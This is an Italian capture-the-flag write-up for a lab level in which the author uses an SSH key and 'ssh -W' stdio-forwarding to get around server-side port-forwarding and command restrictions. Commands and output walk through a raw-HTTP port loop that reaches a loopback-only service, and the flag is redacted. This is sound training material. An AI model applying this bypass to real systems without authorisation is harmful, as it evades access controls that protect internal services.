```
 ========================================================================
   B R E A C H L A B   ::   F I E L D   N O T E S
 ------------------------------------------------------------------------
   phantom track · phile 0x10 · "the tunnel"
 ========================================================================

   target ..: phantom-16  "The Tunnel"
   class ...: pivoting · ssh stdio-forward (-W)
   tools ...: ssh -W · raw HTTP
   author ..: noflyfre
   status ..: owned
```

[← indice](../../README.md)

> il servizio con la flag è bound su loopback dietro un bastion che già
> possiedi. `-L` è murato lato server, i comandi remoti pure. ma SSH è più
> di una shell: `-W` apre un canale TCP diretto e passa lo stesso.

## ----[ 0x00 · intel ]----

Dal brief:

```text
MISSION: The Tunnel
==================

You are on the entry host (10.13.37.2) of phantom-net (10.13.37.0/24).
The flag for this level is served by an HTTP service on 10.13.37.30.
The service is bound to loopback only — direct TCP from this host will
be refused.

Materials:
  ~/.ssh/id_ed25519_ops    — private key for ops@10.13.37.30

SSH is more than a login shell. Read the options on the client side and
figure out how to reach a loopback-bound service through a bastion you
already own.
```

Obiettivo: dall'entry host `10.13.37.2` raggiungere un servizio HTTP legato
solo a `127.0.0.1` su `10.13.37.30`, usando SSH come bastion con la chiave
fornita.

## ----[ 0x01 · recon ]----

Local forward classico (`-L`):

```bash
ssh -L 8080:localhost:80 ops@10.13.37.30
ops@10.13.37.30: Permission denied (publickey).
```

Serve la chiave esplicita:

```bash
ssh -i ./.ssh/id_ed25519_ops -L 8080:localhost:80 ops@10.13.37.30
PTY allocation request failed on channel 2
^C
```

PTY fallisce (shell interattiva ristretta/disabilitata su `ops`). Con `-N`
in background:

```bash
ssh -i ./.ssh/id_ed25519_ops -L 8080:localhost:80 ops@10.13.37.30 -N &
curl http://localhost:8080
channel 2: open failed: administratively prohibited: open failed
curl: (56) Recv failure: Connection reset by peer
```

Il forward locale è rifiutato lato server (`administratively prohibited`):
`no-port-forwarding`/`PermitOpen` in `authorized_keys`/`sshd_config`. E
anche i comandi remoti sono vietati:

```bash
ssh -i ./.ssh/id_ed25519_ops ops@10.13.37.30 curl http://127.0.0.1:80
restricted endpoint
```

`command=` forzato: l'accesso è limitato a un uso molto specifico del
canale.

## ----[ 0x02 · il difetto ]----

Con `-L` bloccato ma una chiave valida in mano, l'alternativa è `-W
host:port`: apre un singolo canale TCP diretto (stdio-forwarding) verso
`host:port` attraverso SSH, senza listener locale né comandi remoti — stdin/
stdout del client collegati direttamente al socket remoto. Ci si passa a
mano una richiesta HTTP grezza (HTTP/1.0 raw), bypassando le restrizioni
sul port-forwarding classico, perché `-W` usa un meccanismo diverso spesso
non coperto dalle stesse direttive.

## ----[ 0x03 · exploit ]----

1. Tentativo di stdio-forward diretto sulla 80:

```bash
echo -e "GET / HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n" | ssh -i ./.ssh/id_ed25519_ops -W 127.0.0.1:80 ops@10.13.37.30
channel 0: open failed: administratively prohibited: open failed
stdio forwarding failed
```

La 80 è esplicitamente bloccata: il servizio è altrove, o quella porta è in
blacklist.

2. Ipotesi: porta diversa. Scan manuale delle porte comuni via loop, `-W`
   per ognuna con richiesta HTTP/1.0 raw:

```bash
for port in 80 8080 8000 3000 5000; do
  echo -e "GET / HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n" | ssh -i ./.ssh/id_ed25519_ops -W 127.0.0.1:$port ops@10.13.37.30 2>/dev/null
done
```

3. Una porta risponde con un HTTP valido, servito da un semplice server
   Python:

```
HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.10.12
Date: Sun, 28 Jun 2026 15:32:04 GMT
Content-Type: text/plain
Content-Length: 27

<REDACTED_FLAG>
```

## ----[ 0x04 · loot ]----

`ssh -W host:port` per instradare una richiesta HTTP grezza dentro il
tunnel (bypassando le restrizioni sul forward classico) raggiunge il
servizio loopback su `10.13.37.30` e consegna la flag (valore fuori dal
writeup). Lezione: quando `-L` è murato, `-W` spesso passa dalla porta di
servizio.

```
--[ eof ]---------------------------------------------------------------

  breachlab.org · phantom track
```
